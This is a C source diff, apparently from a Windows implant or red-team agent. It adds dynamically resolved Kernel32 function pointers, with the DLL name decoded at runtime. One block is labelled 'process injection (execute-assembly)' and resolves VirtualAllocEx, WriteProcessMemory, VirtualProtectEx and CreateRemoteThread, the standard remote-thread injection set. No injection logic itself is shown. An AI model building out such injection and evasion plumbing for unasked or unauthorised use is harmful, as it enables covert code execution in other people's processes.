@@ -93,6 +93,7 @@ PFN_LocalFree fnLocalFree = NULL;
 PFN_ReadFile fnReadFile = NULL;
 PFN_WriteFile fnWriteFile = NULL;
 PFN_CreateFileA fnCreateFileA2 = NULL;
+PFN_CreateFileW fnCreateFileW2 = NULL;
 PFN_GetModuleFileNameA fnGetModuleFileNameA = NULL;
 PFN_GetNativeSystemInfo fnGetNativeSystemInfo = NULL;
 PFN_MultiByteToWideChar fnMultiByteToWideChar = NULL;
@@ -112,6 +113,8 @@ PFN_GetCurrentProcess fnGetCurrentProcess = NULL;
 PFN_GetCurrentProcessId fnGetCurrentProcessId = NULL;
 PFN_FindFirstFileA fnFindFirstFileA = NULL;
 PFN_FindNextFileA fnFindNextFileA = NULL;
+PFN_FindFirstFileW fnFindFirstFileW = NULL;
+PFN_FindNextFileW fnFindNextFileW = NULL;
 PFN_FindClose fnFindClose = NULL;
 PFN_GetFileAttributesExA fnGetFileAttributesExA = NULL;
 PFN_FileTimeToSystemTime fnFileTimeToSystemTime = NULL;
@@ -174,6 +177,12 @@ PFN_DeleteProcThreadAttributeList fnDeleteProcThreadAttributeList = NULL;
 PFN_HeapAlloc fnHeapAlloc = NULL;
 PFN_GetProcessHeap fnGetProcessHeap = NULL;
 PFN_HeapFree fnHeapFree = NULL;
+
+/* Kernel32 — process injection (execute-assembly) */
+PFN_VirtualAllocEx fnVirtualAllocEx = NULL;
+PFN_WriteProcessMemory fnWriteProcessMemory = NULL;
+PFN_VirtualProtectEx fnVirtualProtectEx = NULL;
+PFN_CreateRemoteThread fnCreateRemoteThread = NULL;
 
 void resolve_apis(void) {
     wchar_t _k32w[ENC_DLL_KERNEL32_LEN + 1];
@@ -312,6 +321,7 @@ void resolve_apis(void) {
     RESOLVE_SOFT(fnReadFile,                hK32, ReadFile);
     RESOLVE_SOFT(fnWriteFile,               hK32, WriteFile);
     RESOLVE_SOFT(fnCreateFileA2,            hK32, CreateFileA);
+    RESOLVE_SOFT(fnCreateFileW2,            hK32, CreateFileW);
     RESOLVE_SOFT(fnGetModuleFileNameA,      hK32, GetModuleFileNameA);
     RESOLVE_SOFT(fnGetNativeSystemInfo,     hK32, GetNativeSystemInfo);
     RESOLVE_SOFT(fnMultiByteToWideChar,     hK32, MultiByteToWideChar);
@@ -331,6 +341,8 @@ void resolve_apis(void) {
     RESOLVE_SOFT(fnGetCurrentProcessId,     hK32, GetCurrentProcessId);
     RESOLVE_SOFT(fnFindFirstFileA,          hK32, FindFirstFileA);
     RESOLVE_SOFT(fnFindNextFileA,           hK32, FindNextFileA);
+    RESOLVE_SOFT(fnFindFirstFileW,          hK32, FindFirstFileW);
+    RESOLVE_SOFT(fnFindNextFileW,           hK32, FindNextFileW);
     RESOLVE_SOFT(fnFindClose,               hK32, FindClose);
     RESOLVE_SOFT(fnGetFileAttributesExA,    hK32, GetFileAttributesExA);
     RESOLVE_SOFT(fnFileTimeToSystemTime,    hK32, FileTimeToSystemTime);
@@ -379,6 +391,12 @@ void resolve_apis(void) {
     RESOLVE_SOFT(fnHeapAlloc,                         hK32, HeapAlloc);
     RESOLVE_SOFT(fnGetProcessHeap,                    hK32, GetProcessHeap);
     RESOLVE_SOFT(fnHeapFree,                          hK32, HeapFree);
+
+    /* Kernel32 — process injection (execute-assembly) */
+    RESOLVE_SOFT(fnVirtualAllocEx,       hK32, VirtualAllocEx);
+    RESOLVE_SOFT(fnWriteProcessMemory,   hK32, WriteProcessMemory);
+    RESOLVE_SOFT(fnVirtualProtectEx,     hK32, VirtualProtectEx);
+    RESOLVE_SOFT(fnCreateRemoteThread,   hK32, CreateRemoteThread);
 
     #undef RESOLVE_SOFT
 }
